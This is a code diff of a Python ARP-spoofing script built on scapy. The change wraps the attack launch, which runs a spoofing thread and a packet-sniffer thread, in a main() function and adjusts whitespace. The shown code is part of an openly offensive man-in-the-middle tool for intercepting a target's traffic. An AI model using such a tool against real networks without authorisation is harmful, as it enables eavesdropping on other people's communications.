@@ -10,8 +10,8 @@ import threading
 
 """------------------returns the MAC address of a device given its IP address"""
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst = ip)
-    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    arp_request = scapy.ARP(pdst = ip)                  
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")  
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(arp_request_broadcast, 
                                 timeout = 5, 
@@ -80,18 +80,20 @@ print("gateway\t", gateway_mac,"|", gateway_ip)
 print("target\t", target_mac,"|", target_ip)
 
 """-------------------------------------------------Start the spoofing attack""" 
-try:
-    thread1 = threading.Thread(target=arp_spoof)
-    thread2 = threading.Thread(target=packet_sniffer)
-    thread1.start()
-    thread2.start()
-    time.sleep(2)
-    """-----------------------------------------------------restore when done"""
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[+] Arp Spoof Stopped")
+def main():
+    try:
+        thread1 = threading.Thread(target=arp_spoof)
+        thread2 = threading.Thread(target=packet_sniffer)
+        thread1.start()
+        thread2.start()
+        time.sleep(2)
+        """-----------------------------------------------------restore when done"""
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
+        print("[+] Arp Spoof Stopped")
 
-
+if __name__ == "__main__":
+    main()
 
